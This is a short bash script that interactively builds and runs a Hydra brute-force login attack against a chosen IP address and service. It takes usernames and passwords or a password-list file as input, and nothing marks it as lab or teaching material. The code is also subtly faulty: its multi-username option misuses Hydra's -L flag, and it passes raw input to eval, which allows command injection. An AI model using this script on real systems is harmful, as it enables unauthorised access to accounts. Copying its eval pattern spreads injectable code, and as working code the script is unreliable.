#!/bin/bash

# Prompt for the target IP address
read -p "Enter the target IP address: " ip_addr

# Prompt for the service (e.g., ssh, ftp, http, etc.)
read -p "Enter the service (e.g., ssh, ftp, http, etc.): " service

# Ask if using a non-standard port
read -p "Are you using a non-standard port? (y/n): " non_standard_port
if [[ "$non_standard_port" == "y" || "$non_standard_port" == "Y" ]]; then
    read -p "Enter the non-standard port: " port
    port_flag="-s $port"
else
    port_flag=""
fi

# Prompt user for single or multiple usernames
read -p "Do you want to use a single username or multiple usernames? (Enter 'single' or 'multiple'): " user_option
if [[ "$user_option" == "single" ]]; then
    read -p "Enter the username: " username
    user_flag="-l $username"
elif [[ "$user_option" == "multiple" ]]; then
    read -p "Enter the usernames (space-separated): " usernames
    user_flag="-L"
    for user in $usernames; do
        user_flag="$user_flag $user"
    done
else
    echo "Invalid option for username selection."
    exit 1
fi

# Prompt user for single or multiple passwords
read -p "Do you want to use a single password or a list of passwords? (Enter 'single' or 'list'): " pass_option
if [[ "$pass_option" == "single" ]]; then
    read -p "Enter the password: " password
    pass_flag="-p $password"
elif [[ "$pass_option" == "list" ]]; then
    read -p "Enter the path to the password list file: " password_list
    pass_flag="-P $password_list"
else
    echo "Invalid option for password selection."
    exit 1
fi

# Display the full hydra command
echo "Running command: hydra $user_flag $pass_flag $ip_addr $port_flag $service"

# Run the Hydra command
eval "hydra $user_flag $pass_flag $ip_addr $port_flag $service"
